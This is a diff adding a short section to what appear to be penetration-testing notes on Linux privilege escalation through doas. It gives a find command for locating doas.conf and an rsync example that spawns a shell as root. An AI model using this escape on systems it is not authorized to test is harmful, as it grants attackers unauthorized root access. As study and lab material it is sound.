@@ -324,5 +324,24 @@ References:
 
 ----------------------
 
+### Privesc with doas 
+
+- Doas allows execution of commands as another user
+- Find `doas.conf` with
+
+      find / -name "doas.conf" -type f 2</dev/null
+
+![image](https://github.com/user-attachments/assets/cfc414f8-1003-4122-a731-66f8f096f89b)
+
+- To execute commands,use
+
+       doas -u <user> <command> <args>
+       e.g doas -u root rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
+
+--------------------------
+
+
+
+
 
   
